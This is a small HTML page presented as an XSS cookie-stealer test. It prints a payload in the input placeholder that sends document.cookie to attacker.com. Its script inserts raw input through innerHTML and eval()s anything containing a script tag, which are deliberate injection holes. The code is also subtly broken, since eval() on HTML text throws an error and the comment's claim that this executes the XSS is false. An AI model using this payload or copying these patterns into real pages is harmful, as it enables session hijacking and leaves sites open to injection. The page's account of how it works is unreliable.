<!DOCTYPE html>
<html>
<head>
    <title>XSS Session Cookie Stealer Input</title>
</head>
<body>
    <h2>XSS Session Cookie Test</h2>
    <p>Enter XSS payload in the input field below:</p>
    
    <input type="text" id="xssInput" placeholder='"><script>new Image().src="http://attacker.com" + document.cookie;</script>' size="100">
    
    <button onclick="executeXSS()">Execute XSS</button>
    
    <div id="result" style="margin-top: 20px;"></div>

    <script>
        function executeXSS() {
            var payload = document.getElementById('xssInput').value;
            document.getElementById('result').innerHTML = '<b>Executed payload:</b> ' + payload;
            
            // This will execute the XSS if it's a script tag
            if (payload.toLowerCase().includes('<script>')) {
                eval(payload);
            }
        }
    </script>
</body>
</html>
